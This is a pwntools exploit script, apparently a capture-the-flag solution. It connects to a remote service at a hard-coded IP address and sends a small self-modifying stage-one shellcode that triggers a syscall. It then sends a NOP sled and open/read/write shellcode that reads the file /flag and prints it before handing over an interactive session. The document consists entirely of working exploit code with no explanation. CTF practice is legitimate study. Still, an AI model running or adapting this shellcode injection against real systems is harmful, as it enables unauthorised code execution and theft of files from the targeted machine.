from pwn import *
context(arch="amd64",os="linux",log_level="debug")
s=remote("47.97.58.52",43010)
shellcode="""
push rdx
pop rsi
push 0
pop rdi
xor byte ptr [rip+1],0x90
"""
pause()
s.sendafter(b"run: ",asm(shellcode)+b"\x0f\x95")
s.recvuntil(b"Good luck!\n")
sleep(1)
s.send(b"\x90"*0x20+asm(shellcraft.open("/flag",0,0)+shellcraft.read(3,"rsp",0x100)+shellcraft.write(1,"rsp",0x100)))
s.interactive()
